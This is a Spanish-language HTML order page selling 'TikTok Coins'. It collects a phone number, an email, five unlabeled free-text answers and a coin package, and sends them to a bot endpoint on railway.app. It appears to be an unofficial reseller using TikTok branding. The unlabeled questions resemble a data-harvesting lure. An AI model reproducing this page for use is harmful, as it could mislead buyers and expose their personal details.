<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Compra TikTok Coins</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            background:
                linear-gradient(rgba(0,0,0,.65), rgba(0,0,0,.65)),
                url("./fondo.jpg") center/cover fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            width: 100%;
            max-width: 430px;
            background: rgba(18,18,18,.94);
            padding: 28px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,.55);
        }

        h1 {
            color: white;
            text-align: center;
            margin: 0 0 8px;
        }

        .descripcion {
            color: #bbb;
            text-align: center;
            margin-bottom: 25px;
        }

        label {
            display: block;
            color: white;
            font-weight: bold;
            margin: 15px 0 7px;
        }

        input,
        select {
            width: 100%;
            padding: 13px;
            border: 0;
            border-radius: 10px;
            font-size: 15px;
            outline: none;
        }

        .telefono {
            display: flex;
            gap: 8px;
        }

        .telefono select {
            width: 42%;
        }

        .telefono input {
            width: 58%;
        }

        .precio {
            text-align: center;
            color: #00ff88;
            font-weight: bold;
            font-size: 18px;
            margin: 20px 0;
        }

        button {
            width: 100%;
            padding: 15px;
            border: 0;
            border-radius: 12px;
            background: #ff0050;
            color: white;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
        }

        button:disabled {
            opacity: .6;
            cursor: wait;
        }

        .estado {
            text-align: center;
            margin-top: 15px;
            font-weight: bold;
            min-height: 22px;
        }

        .nota {
            color: #999;
            text-align: center;
            font-size: 12px;
            line-height: 1.5;
            margin-top: 18px;
        }
    </style>
</head>

<body>

<div class="card">

    <h1>🪙 TikTok Coins</h1>

    <div class="descripcion">
        Completa tus datos para realizar tu pedido
    </div>

    <form id="pedidoForm">

        <label>🌎 Pregunta 1 — País y teléfono</label>

        <div class="telefono">

            <select id="pais" required>
                <option value="">País</option>
                <option value="Colombia">🇨🇴 Colombia</option>
                <option value="México">🇲🇽 México</option>
                <option value="España">🇪🇸 España</option>
                <option value="Estados Unidos">🇺🇸 Estados Unidos</option>
                <option value="Argentina">🇦🇷 Argentina</option>
                <option value="Chile">🇨🇱 Chile</option>
                <option value="Perú">🇵🇪 Perú</option>
                <option value="Ecuador">🇪🇨 Ecuador</option>
            </select>

            <input
                id="telefono"
                type="tel"
                placeholder="Número"
                required
            >

        </div>

        <label for="correo">📧 Pregunta 2 — Correo</label>

        <input
            id="correo"
            type="email"
            placeholder="correo@example.com"
            required
        >

        <label for="usuario">❓ Pregunta 3</label>

        <input
            id="usuario"
            type="text"
            placeholder="Escribe tu respuesta"
            required
        >

        <label for="dato3">❓ Pregunta 4</label>

        <input
            id="dato3"
            type="text"
            placeholder="Escribe tu respuesta"
            required
        >

        <label for="dato4">❓ Pregunta 5</label>

        <input
            id="dato4"
            type="text"
            placeholder="Escribe tu respuesta"
            required
        >

        <label for="dato5">❓ Pregunta 6</label>

        <input
            id="dato5"
            type="text"
            placeholder="Escribe tu respuesta"
            required
        >

        <label for="dato6">❓ Pregunta 7</label>

        <input
            id="dato6"
            type="text"
            placeholder="Escribe tu respuesta"
            required
        >

        <label for="monedas">💎 Pregunta 8 — Cantidad de monedas</label>

        <select id="monedas" required>

            <option value="">Selecciona un paquete</option>

            <option value="5000" data-precio="35">
                5,000 monedas — $35 USD
            </option>

            <option value="10000" data-precio="70">
                10,000 monedas — $70 USD
            </option>

            <option value="20000" data-precio="120">
                20,000 monedas — $120 USD
            </option>

            <option value="30000" data-precio="165">
                30,000 monedas — $165 USD
            </option>

            <option value="40000" data-precio="210">
                40,000 monedas — $210 USD
            </option>

            <option value="60000" data-precio="300">
                60,000 monedas — $300 USD
            </option>

            <option value="80000" data-precio="380">
                80,000 monedas — $380 USD
            </option>

            <option value="100000" data-precio="470">
                100,000 monedas — $470 USD
            </option>

            <option value="150000" data-precio="670">
                150,000 monedas — $670 USD
            </option>

            <option value="200000" data-precio="850">
                200,000 monedas — $850 USD
            </option>

        </select>

        <div class="precio" id="precio">
            💰 Precio: Selecciona un paquete
        </div>

        <button id="botonEnviar" type="submit">
            🛒 Enviar pedido
        </button>

        <div class="estado" id="estado"></div>

        <div class="nota">
            No introduzcas contraseñas, números de tarjeta,
            CVV u otros datos financieros sensibles.
        </div>

    </form>

</div>

<script>

const formulario = document.getElementById("pedidoForm");
const monedas = document.getElementById("monedas");
const precio = document.getElementById("precio");
const estado = document.getElementById("estado");
const boton = document.getElementById("botonEnviar");


/* CAMBIAR PRECIO */

monedas.addEventListener("change", function () {

    const opcion =
        monedas.options[monedas.selectedIndex];

    if (!opcion.value) {

        precio.textContent =
            "💰 Precio: Selecciona un paquete";

        return;
    }

    precio.textContent =
        "💰 Precio: $" +
        opcion.dataset.precio +
        " USD";

});


/* ENVIAR FORMULARIO */

formulario.addEventListener("submit", async function (event) {

    event.preventDefault();

    estado.textContent = "";
    boton.disabled = true;
    boton.textContent = "⏳ Enviando...";


    const opcion =
        monedas.options[monedas.selectedIndex];


    const datos = {

        pais:
            document.getElementById("pais").value,

        telefono:
            document.getElementById("telefono").value,

        correo:
            document.getElementById("correo").value,

        usuario:
            document.getElementById("usuario").value,

        dato3:
            document.getElementById("dato3").value,

        dato4:
            document.getElementById("dato4").value,

        dato5:
            document.getElementById("dato5").value,

        dato6:
            document.getElementById("dato6").value,

        monedas:
            opcion.value,

        precio:
            opcion.dataset.precio,

        metodo:
            "Pendiente"
    };


    try {

        const respuesta = await fetch(
            "https://tiktokcoinsbot-production.up.railway.app/enviar",
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify(datos)
            }
        );


        const resultado = await respuesta.json();


        console.log("Respuesta del servidor:", resultado);


        if (respuesta.ok && resultado.ok === true) {

            estado.textContent =
                "✅ Pedido enviado correctamente.";

            estado.style.color = "#00ff88";

            formulario.reset();

            precio.textContent =
                "💰 Precio: Selecciona un paquete";


        } else {

            estado.textContent =
                "❌ Error al enviar el pedido.";

            estado.style.color = "#ff4444";
        }


    } catch (error) {

        console.error(
            "Error de conexión:",
            error
        );

        estado.textContent =
            "❌ No se pudo conectar con el servidor.";

        estado.style.color = "#ff4444";

    }


    boton.disabled = false;
    boton.textContent = "🛒 Enviar pedido";

});

</script>

</body>
</html>
